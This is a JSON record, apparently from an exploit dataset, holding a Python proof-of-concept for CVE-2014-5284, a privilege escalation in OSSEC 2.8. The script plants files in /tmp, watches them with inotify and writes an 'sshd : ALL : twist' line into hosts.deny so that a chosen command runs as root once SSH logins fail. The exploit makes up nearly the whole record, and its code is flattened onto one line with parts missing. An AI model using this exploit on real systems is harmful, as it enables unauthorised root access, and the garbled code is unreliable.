{
    "text": "vul_name : OSSEC 2.8 Privilege Escalation ， vul_cve : CVE-2014-5284 ， vul_poc :  #  ! /usr/bin/python ，  # Exploit Title : ossec 2.8 Insecure Temporary File Creation Vulnerability Privilege Escalation ，  # Date : 14-11-14 ，  # Exploit Author : skynet-13 ，  # Vendor Homepage : www.ossec.net/ ，  # Software Link :  ，  # Version : OSSEC - 2.8 ，  # Tested on : Ubunutu x86_64 ，  # CVE : 2014-5284 ，  # Created from Research by ，  # Jeff Petersen ，  # Roka Security LLC ，  # jpetersen @ rokasecurity.com ，  # Original info at ，  # Run this on target machine and follow instructions to execute command as root ， from twisted.internet import inotify ， from twisted.python import filepath ， from twisted.internet import reactor ， class HostDenyExploiter ( object )  :  ， self.path = path_to_watch ， self.notifier = inotify.INotify (  )  ， self.exploit = cmd ， print \"=\" ， print \"Creating /tmp/hosts.deny.300 through /tmp/hosts.deny.65536 .\" ， filename = \"/tmp/hosts.deny.%s\" % i ， f = open ( filename , 'w' )  ， f.write ( \" )  ， f.close (  )  ， print \"=\" ， print \"Monitoring tmp for file change.\" ， print \"ssh into the system a few times with an incorrect password\" ， print \"Then wait for up to 10 mins\" ， print \"=\" ， self.notifier.startReading (  )  ， self.notifier.watch ( filepath.FilePath ( self.path )  , callbacks= [ self.on_file_change ]  )  ， print 'Writing exploit to this file' ， f = open ( str ( path ) .split ( \"'\" )  [ 1 ]  , 'w' )  ， f.write ( ' sshd : ALL : twist %s \\n' % self.exploit )  ， f.close (  )  ， print \"=\" ， print \" ssh in again to execute the command\" ， print \"=\" ， print \" End Prog.\" ， os.kill ( os.getpid (  )  , signal.SIGUSR1 )  ， print 'File : ' , str ( path ) .split ( \"'\" )  [ 1 ]  , ' has just been modified' ， self.notifier.stopReading (  )  ， self.write_exploit_to_file ( path )  ， parser = optparse.OptionParser ( \"usage of program \\n\" + \"-c Command to run as root in quotes\\n\" )  ， parser.add_option ( '-c' , dest='cmd' , type='string' , help='Used to specify a command to run as root' )  ，  ( options , args ) = parser.parse_args (  )  ， cmd = options.cmd ， print parser.usage ， exit ( 0 )  ， ex = HostDenyExploiter ( '/tmp' , cmd )  ， ex.create_files (  )  ， ex.watch_files (  )  ， reactor.run (  )  ， exit ( 0 ) ",
    "time": "2014.11.15"
}